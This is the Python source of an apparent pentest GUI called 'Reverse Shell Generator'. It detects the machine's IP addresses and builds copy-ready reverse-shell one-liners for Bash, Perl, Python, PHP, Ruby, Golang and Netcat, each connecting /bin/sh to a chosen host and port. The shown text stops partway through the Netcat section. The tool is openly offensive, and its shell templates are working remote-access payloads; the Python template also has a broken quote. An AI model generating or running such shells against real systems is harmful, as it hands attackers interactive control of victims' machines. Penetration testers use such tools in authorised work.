import customtkinter, socket
import tkinter as tk
import netifaces, requests
import pyperclip, datetime
import tkinter, inspect
from PIL import Image
import webbrowser

class RSGeneratorApp(customtkinter.CTk):

    def __init__(self):
        super().__init__()

        self.geometry("517x783")
        self.maxsize(width=635, height=794)
        self.minsize(width=517, height=783)
        self.title("Reverse Shell Generator")

        self.loading_label = customtkinter.CTkLabel(self, font=customtkinter.CTkFont(size=40), text="Starting ...", justify="left")

        self.colormain = "#8338ec"
        self.color_hover = "#7421ea"
        self.color_optionbtn = "#8338ec"

        self.grid_columnconfigure(0, weight=1)

        self.rs_selected = 'Bash'

        self.line = 1

        print("RSGenerator - Code By 14WUAL")
        print("Version:  RSG V 1.0 | Jun2023")
        print("Welcome!")
        print(f"[INFO | {Get.return_time()}] Reverse Shell Generator Started")
        print(f"[INFO | {Get.return_time()}] Reverse Shell Selected: Bash(default)")

        Common(self)

        for column in range(5):
            self.grid_columnconfigure(column, weight=1)
            print(f"[INFO | {Get.return_time()}] Column Main Frame {column} Configure: Weight 1")

class Common:

    def __init__(self, RSGeneratorApp) -> None:
        
        self = RSGeneratorApp

        self.select_shell_var = customtkinter.StringVar(value="Bash")
        print(f"[INFO | {Get.return_time()}] Shells Available: {', '.join([str(item) for item in Get.select_list()])}")
        Common.ip_select(self);Common.port_select(self)
        Common.pre_content_loaded(self)
        Activate.update_rs(self)
        Common.footer(self)

    def footer(self):

        self.footer_frame = customtkinter.CTkFrame(self)
        self.footer_frame.grid(row=9, column=0, columnspan=4, padx=10, pady=(10,0), sticky="ew")

        label = customtkinter.CTkLabel(self.footer_frame, text="Code by 14WUAL © 2023 | DDBB: PentestMonkey ")
        label.grid(row=0, column = 0, pady=5, padx=5)

        self.footer_frame.grid_columnconfigure(0, weight=1)

        code_img = customtkinter.CTkImage(light_image=Image.open("src/terminal.png"),dark_image=Image.open("src/terminal.png"),size=(15, 15))
        ddbb_img = customtkinter.CTkImage(light_image=Image.open("src/database.png"),dark_image=Image.open("src/database.png"),size=(15, 15))
        heart_img = customtkinter.CTkImage(light_image=Image.open("src/heart.png"),dark_image=Image.open("src/heart.png"),size=(15, 15))
        follow_img = customtkinter.CTkImage(light_image=Image.open("src/following.png"),dark_image=Image.open("src/following.png"),size=(15, 15))
        web_img = customtkinter.CTkImage(light_image=Image.open("src/globe.png"),dark_image=Image.open("src/globe.png"),size=(15, 15))

        btn_code = customtkinter.CTkButton(self.footer_frame, text="", image=code_img, fg_color="transparent", width=20, height=20, hover=False, command=lambda:webbrowser.open("https://github.com/14wual/rsgenerator"))
        btn_ddbb = customtkinter.CTkButton(self.footer_frame, text="", image=ddbb_img, fg_color="transparent", width=20, height=20, hover=False,command=lambda:webbrowser.open("https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#revshells"))
        btn_heart = customtkinter.CTkButton(self.footer_frame, text="", image=heart_img, fg_color="transparent", width=20, height=20, hover=False, command=lambda:webbrowser.open("https://github.com/sponsors/14wual"))
        btn_follow = customtkinter.CTkButton(self.footer_frame, text="", image=follow_img, fg_color="transparent", width=20, height=20, hover=False, command=lambda:webbrowser.open("https://github.com/sponsors/14wual"))
        btn_web = customtkinter.CTkButton(self.footer_frame, text="", image=web_img, fg_color="transparent", width=20, height=20, hover=False, command=lambda:webbrowser.open("https://14wual.github.io/rsgen"))

        btn_code.grid(row=0, column=2, pady=5, padx=5)
        btn_ddbb.grid(row=0, column=3, pady=5, padx=5)
        btn_heart.grid(row=0, column=4, pady=5, padx=5)
        btn_follow.grid(row=0, column=5, pady=5, padx=5)
        btn_web.grid(row=0, column=6, pady=5, padx=5)

    def select_callback(self):
        self.rs_selected = self.select_shell_var.get()
        Activate.update_rs(self)

    def ip_select(self):

        private_ip = Get.get_private_ip(self);public_ip = Get.get_public_ip(self)
        localhost = Get.get_localhost(self);vpn_ip = Get.get_vpn_ip(self)

        self.ip_selected = str(private_ip)
        print(f"[INFO | {Get.return_time()}] IP Selected: {self.ip_selected} (default - ip.private)")

        if public_ip == 500:
            public_ip = 'Public IP Failed';
            print(f"[INFO | {Get.return_time()}] Public IP Failed (500)")
        else:print(f"[INFO | {Get.return_time()}] Public IP: {public_ip}")

        if private_ip == 500:
            private_ip = 'Private IP Failed';
            print(f"[INFO | {Get.return_time()}] Private IP Failed (500)")
        else:print(f"[INFO | {Get.return_time()}] Private IP: {private_ip}")

        if localhost == 500:
            localhost = 'Localhost IP Failed';
            print(f"[INFO | {Get.return_time()}] LocalHost IP Failed (500)")
        else:print(f"[INFO | {Get.return_time()}] LocalHost IP: {localhost}")

        if vpn_ip == "VPN Disconnected":
            print(f"[INFO | {Get.return_time()}] VPN is Disconected")
        else:print(f"[INFO | {Get.return_time()}] VPN IP: {vpn_ip}")

        self.iplabel = customtkinter.CTkLabel(self, font=customtkinter.CTkFont(size=40), text="IP Select",justify="left",  text_color="#3D3B39")

        self.ip_select_frame = customtkinter.CTkFrame(self)
        for column in range(4):
            print(f"[INFO | {Get.return_time()}] Column Select Frame {column} Configure: Weight 1")
            self.ip_select_frame.grid_columnconfigure(column, weight=1)

        self.custom_ip_entry = customtkinter.CTkEntry(self.ip_select_frame, placeholder_text="Enter a custom IP")
        self.private_ip_btn = customtkinter.CTkButton(self.ip_select_frame, text=private_ip, command=lambda ip=private_ip:Common.ip_select_event(self, ip))
        self.public_ip_btn = customtkinter.CTkButton(self.ip_select_frame, text=public_ip, command=lambda ip=public_ip:Common.ip_select_event(self, ip))
        self.localhost_btn = customtkinter.CTkButton(self.ip_select_frame, text=localhost, command=lambda ip=localhost:Common.ip_select_event(self, ip))
        self.vpn_ip_btn = customtkinter.CTkButton(self.ip_select_frame, text=vpn_ip, command=lambda ip=vpn_ip:Common.ip_select_event(self, ip))

        self.private_ip_btn.configure(fg_color="transparent", border_color=self.colormain, border_width=2, hover_color=self.colormain)
        self.public_ip_btn.configure(fg_color="transparent", border_color=self.colormain, border_width=2, hover_color=self.colormain)
        self.localhost_btn.configure(fg_color="transparent", border_color=self.colormain, border_width=2, hover_color=self.colormain)
        self.vpn_ip_btn.configure(fg_color="transparent", border_color=self.colormain, border_width=2, hover_color=self.colormain)

        self.ip_label = customtkinter.CTkLabel(master=self.ip_select_frame, text=f"IP Selected: {self.ip_selected}")

        self.custom_ip_entry.bind("<KeyRelease>", lambda event, self=self: Common.update_custom_ip_entry(self))

    def ip_select_event(self, ip):
        self.ip_selected = str(ip)
        self.ip_label.configure(text=f"IP Selected: {self.ip_selected}")
        print(f"[INFO | {Get.return_time()}] IP Selected: {self.ip_selected}")
        Activate.update_rs(self)

    def update_custom_ip_entry(self):
        Common.ip_select_event(self, str(self.custom_ip_entry.get()))

    def port_select(self):

        self.plus_img = customtkinter.CTkImage(light_image=Image.open("src/plus.png"),dark_image=Image.open("src/plus.png"),size=(15, 15))
        self.minus_img = customtkinter.CTkImage(light_image=Image.open("src/minus.png"),dark_image=Image.open("src/minus.png"),size=(15, 15))

        self.port_selected = "1014"
        print(f"[INFO | {Get.return_time()}] Port Selected: {self.port_selected}(default)")

        self.portlabel = customtkinter.CTkLabel(self, font=customtkinter.CTkFont(size=40), text="Port Select", justify="left",  text_color="#3D3B39")

        self.port_select_frame = customtkinter.CTkFrame(self)
        for column in range(4):
            print(f"[INFO | {Get.return_time()}] Column Port Select Frame {column} Configure: Weight 1")
            self.port_select_frame.grid_columnconfigure(column, weight=1)

        self.default_port_btn_1 = customtkinter.CTkButton(self.port_select_frame, text="1014", command=lambda port="1014":Common.port_select_event(self, port=port))
        self.default_port_btn_2 = customtkinter.CTkButton(self.port_select_frame, text="443", command=lambda port="443":Common.port_select_event(self, port=port))
        self.default_port_btn_3 = customtkinter.CTkButton(self.port_select_frame, text="1234", command=lambda port="1234":Common.port_select_event(self, port=port))
        self.default_port_btn_4 = customtkinter.CTkButton(self.port_select_frame, text="4242", command=lambda port="4242":Common.port_select_event(self, port=port))

        self.default_port_btn_1.configure(fg_color="transparent", border_color=self.colormain, border_width=2, hover_color=self.colormain)
        self.default_port_btn_2.configure(fg_color="transparent", border_color=self.colormain, border_width=2, hover_color=self.colormain)
        self.default_port_btn_3.configure(fg_color="transparent", border_color=self.colormain, border_width=2, hover_color=self.colormain)
        self.default_port_btn_4.configure(fg_color="transparent", border_color=self.colormain, border_width=2, hover_color=self.colormain)
        
        print(f"[INFO | {Get.return_time()}] Default Ports: 1014, 443, 1234, 4242")

        self.port_select_minus = customtkinter.CTkButton(self.port_select_frame, text="", command=lambda ip="-1":Common.calc_custom_port(self, ip),image=self.minus_img)
        self.custom_port_entry_var = customtkinter.StringVar(value=self.port_selected)
        self.custom_port_entry = customtkinter.CTkEntry(self.port_select_frame, textvariable=self.custom_port_entry_var, placeholder_text="Enter a custom Port")
        self.port_select_plus = customtkinter.CTkButton(self.port_select_frame, text="", command=lambda ip="+1":Common.calc_custom_port(self, ip),image=self.plus_img)

        self.port_select_minus.configure(fg_color=self.colormain, hover_color=self.color_hover)
        self.port_select_plus.configure(fg_color=self.colormain, hover_color=self.color_hover)

        self.port_label = customtkinter.CTkLabel(master=self.port_select_frame, text=f"Port Selected: {self.port_selected}")

        self.custom_port_entry.bind("<KeyRelease>", lambda event, self=self: Common.update_custom_port_entry(self))

    def update_custom_port_entry(self):
        port_value = self.custom_port_entry_var.get()
        if not all(char.isdigit() for char in port_value):
            self.custom_port_entry_var.set(value=self.port_selected)
            self.custom_port_entry.configure(value=self.port_selected)
        Common.port_select_event(self, port_value)

    def port_select_event(self, port):
        self.port_selected = str(port)
        self.port_label.configure(text=f"Port Selected: {self.port_selected}")
        print(f"[INFO | {Get.return_time()}] Port Selected: {self.port_selected}")
        self.custom_port_entry_var.set(value=self.port_selected)
        Activate.update_rs(self)

    def calc_custom_port(self, calc):

        expression = str(self.port_selected) + str(calc)
        port = str(eval(expression))

        if int(port) > 65535:port = str(0)
        elif int(port) < 0:port = str(65535)
        else:pass

        Common.port_select_event(self, port=str(port))

    def pre_content_loaded(self):

        self.iplabel.grid(row=3, column=0, columnspan=4, padx=10, pady=(5,0), sticky="w")
        self.portlabel.grid(row=5, column=0, columnspan=4, padx=10, pady=(5,0), sticky="w")

        self.ip_select_frame.grid(row=4, column=0, columnspan=4, padx=10, pady=10, sticky="ew")
        self.port_select_frame.grid(row=6, column=0, columnspan=4, padx=10, pady=10, sticky="ew")

        self.custom_ip_entry.grid(row=0, column=0, padx=5, pady=5, sticky="nsew", columnspan=4)
        self.private_ip_btn.grid(row=1, column=0, padx=5, pady=5, sticky="nsew")
        self.public_ip_btn.grid(row=1, column=1, padx=5, pady=5, sticky="nsew")
        self.localhost_btn.grid(row=1, column=2, padx=5, pady=5, sticky="nsew")
        self.vpn_ip_btn.grid(row=1, column=3, padx=5, pady=5, sticky="nsew")

        self.default_port_btn_1.grid(row=1, column=0, padx=5, pady=5, sticky="nsew")
        self.default_port_btn_2.grid(row=1, column=1, padx=5, pady=5, sticky="nsew")
        self.default_port_btn_3.grid(row=1, column=2, padx=5, pady=5, sticky="nsew")
        self.default_port_btn_4.grid(row=1, column=3, padx=5, pady=5, sticky="nsew")

        self.port_select_minus.grid(row=0, column=0, padx=5, pady=5, sticky="nsew")
        self.custom_port_entry.grid(row=0, column=1, padx=5, pady=5, sticky="nsew",  columnspan=2)
        self.port_select_plus.grid(row=0, column=3, padx=5, pady=5, sticky="nsew")

        self.port_label.grid(row=2, column=0, padx=5, pady=5, sticky="nsew", columnspan=4)
        self.ip_label.grid(row=2, column=0, padx=5, pady=5, sticky="nsew", columnspan=4)

class Get:

    def select_list():
        return ["Awk", "Bash", "Golang", "Groovy", "Java", "Lua", "Ncat", "Netcat", "NodeJS", "Perl", "PHP", "Powershell", "Python", "Ruby", "Telnet"]
    
    def get_private_ip(self):
        print(f"[INFO | {Get.return_time()}] Getting Private IP")
        interfaces = netifaces.interfaces()
        for interface in interfaces:
            addresses = netifaces.ifaddresses(interface)
            if netifaces.AF_INET in addresses:
                for address in addresses[netifaces.AF_INET]:
                    if 'addr' in address:
                        ip = address['addr']
                        if not ip.startswith("127."):return ip
        return 500

    def get_public_ip(self):
        print(f"[INFO | {Get.return_time()}] Getting Public IP")
        ip_public = 500
        try:
            response = requests.get('https://api.ipify.org?format=json')
            if response.status_code == 200:data = response.json();ip_public = data['ip']
            else:ip_public = 500
        except requests.RequestException as error:ip_public = 500;print(f"[EXCEPTION | {Get.return_time()}] requests.RequestException: {error}")
        finally:return ip_public

    def get_localhost(self):
        print(f"[INFO | {Get.return_time()}] Getting LocalHost IP")
        try:ipv4 = socket.gethostbyname_ex(socket.gethostname())[-1][0]
        except socket.error as error:ipv4 = 500;print(f"[EXCEPTION | {Get.return_time()}] socket.error: {error}")
        finally:return ipv4

    def get_vpn_ip(self):
        print(f"[INFO | {Get.return_time()}] Getting VPN IP")
        interfaces = netifaces.interfaces()
        for interface in interfaces:
            if interface == "tun0":
                addresses = netifaces.ifaddresses(interface)
                if netifaces.AF_INET in addresses:
                    for address in addresses[netifaces.AF_INET]:
                        if 'addr' in address:
                            ip = address['addr'];return ip
        return "VPN Disconnected"
    
    def return_time():
        return datetime.datetime.now().strftime("%d:%m:%Y - %H:%M:%S")
    
class Activate:

    def remove_grids(self):

        try:
            self.rs_bash_label_frame.grid_forget()
            self.rdbtn_frame.grid_forget()
            self.rs_netcat_label_frame.grid_forget()
            self.rdbtn_frame_1.grid_forget()
            self.rs_perl_label_frame.grid_forget()
            self.rs_python_label_frame.grid_forget()
            self.rs_php_label_frame.grid_forget()
            self.rs_ruby_label_frame.grid_forget()
            self.rs_golang_label_frame.grid_forget()
            self.rs_netcat_label_frame.grid_forget()
            self.rdbtn_frame_1.grid_forget()
            self.rs_ncat_label_frame.grid_forget()
            self.rdbtn_frame_2.grid_forget()
            self.rs_powershell_label_frame.grid_forget()
            self.rs_awk_label_frame.grid_forget()
            self.rs_java_label_frame.grid_forget()
            self.rs_telnet_label_frame.grid_forget()
            self.rs_lua_label_frame.grid_forget()
            self.rs_nodejs_label_frame.grid_forget()
            self.rs_groovy_label_frame.grid_forget()
            self.no_option_frame.grid_forget()
            self.no_option_label.grid_forget()
        except:pass

    def update_rs(self):

        self.rs_frame = customtkinter.CTkFrame(self)

        try:self.rs_frame.grid_forget()
        except:print(f"[EXCEPT | {Get.return_time()}] ReverShell SubMain Frame Grid not Forgeted")
        finally:self.rs_frame.grid(row=8, column=0, columnspan=4, padx=10, pady=10, sticky="ew")

        Reverse_Shells(self, self.rs_selected)

        classes_shells = {
            "Awk": Reverse_Shells.rs_awk,
            "Bash": Reverse_Shells.rs_bash,
            "Golang": Reverse_Shells.rs_golang,
            "Groovy": Reverse_Shells.rs_groovy,
            "Java": Reverse_Shells.rs_java,
            "Lua": Reverse_Shells.rs_lua,
            "Ncat": Reverse_Shells.rs_ncat,
            "Netcat": Reverse_Shells.rs_netcat,
            "NodeJS": Reverse_Shells.rs_nodejs,
            "Perl": Reverse_Shells.rs_perl,
            "PHP": Reverse_Shells.rs_php,
            "Powershell": Reverse_Shells.rs_powershell,
            "Python": Reverse_Shells.rs_python,
            "Ruby": Reverse_Shells.rs_ruby,
            "Telnet": Reverse_Shells.rs_telnet
        }

        Activate.remove_grids(self)

        self.no_option_frame = customtkinter.CTkFrame(self.rs_frame)
        self.no_option_label = customtkinter.CTkLabel(self.no_option_frame, text="No Options Avilable")

        if self.rs_selected in classes_shells:
            print(f"[INFO | {Get.return_time()}] Reverse Shell Selected: {inspect.getmodule(classes_shells[self.rs_selected]).__name__ + '.' + classes_shells[self.rs_selected].__name__}")
            classes_shells[self.rs_selected](self)

class Reverse_Shells:

    def __init__(self, RSGeneratorApp, shell) -> None:
        
        self = RSGeneratorApp

        for column in range(4):
            print(f"[INFO | {Get.return_time()}] Column ReverShell SubMain Frame {column} Configure: Weight 1")
            self.rs_frame.grid_columnconfigure(column, weight=1)
        self.rs_frame.grid_rowconfigure(2, weight=1)

    class rs_bash:

        def __init__(self, RSGeneratorApp) -> None:
            
            self = RSGeneratorApp

            self.rs_bash_shell = Reverse_Shells.rs_bash.return_rs_bash_tcp(self)

            self.rs_bash_label_frame = customtkinter.CTkFrame(self.rs_frame)
            self.rs_bash_label_frame.grid(row=1, column=0, padx=10, pady=10, sticky="ew", columnspan=2)

            self.rs_bash_select_shell = customtkinter.CTkOptionMenu(self.rs_bash_label_frame, variable=self.select_shell_var, command=lambda value:Common.select_callback(self), fg_color=self.colormain,button_color=self.color_optionbtn, button_hover_color=self.color_hover)
            self.rs_bash_select_shell.configure(values=Get.select_list())
            self.rs_bash_select_shell.grid(row=1, column=0, padx=10, pady=10, sticky="ew", columnspan=2)
            self.rs_bash_label_frame.grid_columnconfigure(1, weight=1)

            self.rdbtn_frame = customtkinter.CTkFrame(self.rs_frame)
            self.rdbtn_frame.grid(row=1, column=2, padx=10, pady=10, sticky="ew", columnspan=2)

            self.rs_bash_radio_var = tkinter.IntVar(value=0)
            radiobutton_1 = customtkinter.CTkRadioButton(self.rdbtn_frame, text="TCP",variable=self.rs_bash_radio_var, value=0, command=lambda:Reverse_Shells.rs_bash.change_rs_bash_type(self),fg_color=self.colormain,hover_color=self.color_hover)
            radiobutton_1.grid(row=1, column=1, padx=10, pady=10, sticky="ew")
            radiobutton_2 = customtkinter.CTkRadioButton(self.rdbtn_frame, text="UDP",variable=self.rs_bash_radio_var, value=1, command=lambda:Reverse_Shells.rs_bash.change_rs_bash_type(self),fg_color=self.colormain,hover_color=self.color_hover)
            radiobutton_2.grid(row=1, column=2, columnspan=4, padx=10, pady=10, sticky="ew")

            self.rs_bashlabel = customtkinter.CTkTextbox(self.rs_frame,)
            self.rs_bashlabel.insert("0.0", text=self.rs_bash_shell);self.rs_bashlabel.configure(state="disabled")
            self.rs_bashlabel.grid(row=2, column=0, columnspan=4, padx=10, pady=10, sticky="ew")

            btn_copy = customtkinter.CTkButton(self.rs_frame,hover_color=self.color_hover, text="Copy Shell", command=lambda: pyperclip.copy(self.rs_bash_shell))
            btn_copy.grid(row=3, column=0, columnspan=4, padx=10, pady=10, sticky="ew")
            btn_copy.configure(fg_color=self.colormain)

            Reverse_Shells.rs_bash.change_rs_bash_type(self)

            print(f"[INFO | {Get.return_time()}] Reverse Shell: {self.rs_bash_shell}")
        
        def change_rs_bash_type(self):
            val = self.rs_bash_radio_var.get()
            if val == 0:
                self.rs_bash_shell = Reverse_Shells.rs_bash.return_rs_bash_tcp(self)
                self.rs_bashlabel.configure(state="normal");self.rs_bashlabel.delete("0.0", "end")
                self.rs_bashlabel.insert("0.0", text=self.rs_bash_shell);self.rs_bashlabel.configure(state="disabled")
            elif val == 1:
                self.rs_bash_shell = Reverse_Shells.rs_bash.return_rs_bash_udp(self)
                self.rs_bashlabel.configure(state="normal");self.rs_bashlabel.delete("0.0", "end")
                self.rs_bashlabel.insert("0.0", text=self.rs_bash_shell);self.rs_bashlabel.configure(state="disabled")
            print(f"[INFO | {Get.return_time()}] Reverse Shell: {self.rs_bash_shell}")

        def return_rs_bash_tcp(self):
            return f"bash -i >& /dev/tcp/{self.ip_selected}/{self.port_selected} 0>&1"
        
        def return_rs_bash_udp(self):
            return f"sh -i >& /dev/udp/{self.ip_selected}/{self.port_selected} 0>&1"
        
    class rs_perl:

        def __init__(self, RSGeneratorApp) -> None:

            self = RSGeneratorApp
            
            shell_parts = {
                1: "perl -e 'use Socket;$i=",
                2: f'"{self.ip_selected}";$p={self.port_selected};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))',
                3: '{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};',
                4: "'"
            }

            shell = ''.join(shell_parts.values())

            self.rs_perl_label_frame = customtkinter.CTkFrame(self.rs_frame)
            self.rs_perl_label_frame.grid(row=1, column=0, padx=10, pady=10, sticky="ew", columnspan=2)

            self.rs_perl_select_shell = customtkinter.CTkOptionMenu(self.rs_perl_label_frame, variable=self.select_shell_var, command=lambda value:Common.select_callback(self), fg_color=self.colormain,button_color=self.color_optionbtn, button_hover_color=self.color_hover)
            self.rs_perl_select_shell.configure(values=Get.select_list())
            self.rs_perl_select_shell.grid(row=1, column=0, padx=10, pady=10, sticky="ew", columnspan=2)
            self.rs_perl_label_frame.grid_columnconfigure(1, weight=1)

            self.no_option_frame.grid(row=1, column=2, padx=10, pady=10, sticky="ew", columnspan=2)
            self.no_option_label.grid(row=1, column=1, padx=10, pady=10, sticky="ew")

            label = customtkinter.CTkTextbox(self.rs_frame,)
            label.insert("0.0", text=shell);label.configure(state="disabled")
            label.grid(row=2, column=0, columnspan=4, padx=10, pady=10, sticky="ew")

            btn_copy = customtkinter.CTkButton(self.rs_frame,hover_color=self.color_hover, text="Copy Shell", command=lambda: pyperclip.copy(str(shell)))
            btn_copy.grid(row=3, column=0, columnspan=4, padx=10, pady=10, sticky="ew")
            btn_copy.configure(fg_color=self.colormain)
            
            print(f"[INFO | {Get.return_time()}] Reverse Shell: {shell}")
    
    class rs_python:

        def __init__(self, RSGeneratorApp) -> None:

            self = RSGeneratorApp

            shell_parts = {
                1: "python -c ",
                2: "'socket=__import__(",
                3: f'"socket");os=__import__("os");pty=__import__(pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{self.ip_selected}",{self.port_selected}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(/bin/sh")',
                4: "'"
            }

            shell = ''.join(shell_parts.values())

            self.rs_python_label_frame = customtkinter.CTkFrame(self.rs_frame)
            self.rs_python_label_frame.grid(row=1, column=0, padx=10, pady=10, sticky="ew", columnspan=2)

            self.rs_python_select_shell = customtkinter.CTkOptionMenu(self.rs_python_label_frame, variable=self.select_shell_var, command=lambda value:Common.select_callback(self), fg_color=self.colormain,button_color=self.color_optionbtn, button_hover_color=self.color_hover)
            self.rs_python_select_shell.configure(values=Get.select_list())
            self.rs_python_select_shell.grid(row=1, column=0, padx=10, pady=10, sticky="ew", columnspan=2)
            self.rs_python_label_frame.grid_columnconfigure(1, weight=1)

            self.no_option_frame.grid(row=1, column=2, padx=10, pady=10, sticky="ew", columnspan=2)
            self.no_option_label.grid(row=1, column=1, padx=10, pady=10, sticky="ew")

            label = customtkinter.CTkTextbox(self.rs_frame,)
            label.insert("0.0", text=shell);label.configure(state="disabled")
            label.grid(row=2, column=0, columnspan=4, padx=10, pady=10, sticky="ew")

            btn_copy = customtkinter.CTkButton(self.rs_frame,hover_color=self.color_hover, text="Copy Shell", command=lambda: pyperclip.copy(str(shell)))
            btn_copy.grid(row=3, column=0, columnspan=4, padx=10, pady=10, sticky="ew")
            btn_copy.configure(fg_color=self.colormain)
            
            print(f"[INFO | {Get.return_time()}] Reverse Shell: {shell}")

    class rs_php:
            
        def __init__(self, RSGeneratorApp) -> None:

            self = RSGeneratorApp

            shell_parts = {
                1: "php -r ",
                2: "'$sock=fsockopen(",
                3: f'"{self.ip_selected}",{self.port_selected});exec("/bin/sh -i <&3 >&3 2>&3");',
                4: "'"
            }

            shell = ''.join(shell_parts.values())

            self.rs_php_label_frame = customtkinter.CTkFrame(self.rs_frame)
            self.rs_php_label_frame.grid(row=1, column=0, padx=10, pady=10, sticky="ew", columnspan=2)

            self.rs_php_select_shell = customtkinter.CTkOptionMenu(self.rs_php_label_frame, variable=self.select_shell_var, command=lambda value:Common.select_callback(self), fg_color=self.colormain,button_color=self.color_optionbtn, button_hover_color=self.color_hover)
            self.rs_php_select_shell.configure(values=Get.select_list())
            self.rs_php_select_shell.grid(row=1, column=0, padx=10, pady=10, sticky="ew", columnspan=2)
            self.rs_php_label_frame.grid_columnconfigure(1, weight=1)

            self.no_option_frame.grid(row=1, column=2, padx=10, pady=10, sticky="ew", columnspan=2)
            self.no_option_label.grid(row=1, column=1, padx=10, pady=10, sticky="ew")

            label = customtkinter.CTkTextbox(self.rs_frame,)
            label.insert("0.0", text=shell);label.configure(state="disabled")
            label.grid(row=2, column=0, columnspan=4, padx=10, pady=10, sticky="ew")

            btn_copy = customtkinter.CTkButton(self.rs_frame,hover_color=self.color_hover, text="Copy Shell", command=lambda: pyperclip.copy(str(shell)))
            btn_copy.grid(row=3, column=0, columnspan=4, padx=10, pady=10, sticky="ew")
            btn_copy.configure(fg_color=self.colormain)
            
            print(f"[INFO | {Get.return_time()}] Reverse Shell: {shell}")

    class rs_ruby:

        def __init__(self, RSGeneratorApp) -> None:

            self = RSGeneratorApp

            shell_parts = {
                1: "ruby -rsocket -e'f=TCPSocket.open(",
                2: f'"{self.ip_selected}",{self.port_selected}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)',
                3: "'",
            }

            shell = ''.join(shell_parts.values())

            self.rs_ruby_label_frame = customtkinter.CTkFrame(self.rs_frame)
            self.rs_ruby_label_frame.grid(row=1, column=0, padx=10, pady=10, sticky="ew", columnspan=2)

            self.rs_ruby_select_shell = customtkinter.CTkOptionMenu(self.rs_ruby_label_frame, variable=self.select_shell_var, command=lambda value:Common.select_callback(self), fg_color=self.colormain,button_color=self.color_optionbtn, button_hover_color=self.color_hover)
            self.rs_ruby_select_shell.configure(values=Get.select_list())
            self.rs_ruby_select_shell.grid(row=1, column=0, padx=10, pady=10, sticky="ew", columnspan=2)
            self.rs_ruby_label_frame.grid_columnconfigure(1, weight=1)

            self.no_option_frame.grid(row=1, column=2, padx=10, pady=10, sticky="ew", columnspan=2)
            self.no_option_label.grid(row=1, column=1, padx=10, pady=10, sticky="ew")

            label = customtkinter.CTkTextbox(self.rs_frame,)
            label.insert("0.0", text=shell);label.configure(state="disabled")
            label.grid(row=2, column=0, columnspan=4, padx=10, pady=10, sticky="ew")

            btn_copy = customtkinter.CTkButton(self.rs_frame,hover_color=self.color_hover, text="Copy Shell", command=lambda: pyperclip.copy(str(shell)))
            btn_copy.grid(row=3, column=0, columnspan=4, padx=10, pady=10, sticky="ew")
            btn_copy.configure(fg_color=self.colormain)
            
            print(f"[INFO | {Get.return_time()}] Reverse Shell: {shell}")

    class rs_golang:

        def __init__(self, RSGeneratorApp) -> None:

            self = RSGeneratorApp

            shell_parts = {
                1: "echo 'package main;import",
                2: '"os/exec";import"net";func main(){c,_:=net.Dial("tcp","',
                3: f'{self.ip_selected}:{self.port_selected}"',
                4: ');cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}',
                5: "' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
            }

            shell = ''.join(shell_parts.values())

            self.rs_golang_label_frame = customtkinter.CTkFrame(self.rs_frame)
            self.rs_golang_label_frame.grid(row=1, column=0, padx=10, pady=10, sticky="ew", columnspan=2)

            self.rs_golang_select_shell = customtkinter.CTkOptionMenu(self.rs_golang_label_frame, variable=self.select_shell_var, command=lambda value:Common.select_callback(self), fg_color=self.colormain,button_color=self.color_optionbtn, button_hover_color=self.color_hover)
            self.rs_golang_select_shell.configure(values=Get.select_list())
            self.rs_golang_select_shell.grid(row=1, column=0, padx=10, pady=10, sticky="ew", columnspan=2)
            self.rs_golang_label_frame.grid_columnconfigure(1, weight=1)

            self.no_option_frame.grid(row=1, column=2, padx=10, pady=10, sticky="ew", columnspan=2)
            self.no_option_label.grid(row=1, column=1, padx=10, pady=10, sticky="ew")

            label = customtkinter.CTkTextbox(self.rs_frame,)
            label.insert("0.0", text=shell);label.configure(state="disabled")
            label.grid(row=2, column=0, columnspan=4, padx=10, pady=10, sticky="ew")

            btn_copy = customtkinter.CTkButton(self.rs_frame,hover_color=self.color_hover, text="Copy Shell", command=lambda: pyperclip.copy(str(shell)))
            btn_copy.grid(row=3, column=0, columnspan=4, padx=10, pady=10, sticky="ew")
            btn_copy.configure(fg_color=self.colormain)
            
            print(f"[INFO | {Get.return_time()}] Reverse Shell: {shell}")

    class rs_netcat:

        def __init__(self, RSGeneratorApp) -> None:

            self = RSGeneratorApp

            self.rs_netcat_shell = Reverse_Shells.rs_netcat.return_rs_netcat_traditional(self)

            self.rs_netcat_label_frame = customtkinter.CTkFrame(self.rs_frame)
            self.rs_netcat_label_frame.grid(row=1, column=0, padx=10, pady=10, sticky="ew", columnspan=2)

            self.rs_netcat_select_shell = customtkinter.CTkOptionMenu(self.rs_netcat_label_frame, variable=self.select_shell_var, command=lambda value:Common.select_callback(self), fg_color=self.colormain,button_color=self.color_optionbtn, button_hover_color=self.color_hover)
            self.rs_netcat_select_shell.configure(values=Get.select_list())
            self.rs_netcat_select_shell.grid(row=1, column=0, padx=10, pady=10, sticky="ew", columnspan=2)
            self.rs_netcat_label_frame.grid_columnconfigure(1, weight=1)

            self.rdbtn_frame_1 = customtkinter.CTkFrame(self.rs_frame)
            self.rdbtn_frame_1.grid(row=1, column=2, padx=10, pady=10, sticky="ew", columnspan=2)

            self.rs_netcat_radio_var = tkinter.IntVar(value=0)
            radiobutton_1 = customtkinter.CTkRadioButton(self.rdbtn_frame_1, text="Traditional",variable=self.rs_netcat_radio_var, value=0, command=lambda:Reverse_Shells.rs_netcat.change_rs_netcat_type(self), fg_color=self.colormain,hover_color=self.color_hover)
            radiobutton_1.grid(row=1, column=1, padx=10, pady=10, sticky="ew")
            radiobutton_2 = customtkinter.CTkRadioButton(self.rdbtn_frame_1, text="OpenBSD",variable=self.rs_netcat_radio_var, value=1, command=lambda:Reverse_Shells.rs_netcat.change_rs_netcat_type(self), fg_color=self.colormain,hover_color=self.color_hover)
            radiobutton_2.grid(row=1, column=2, padx=10, pady=10, sticky="ew")
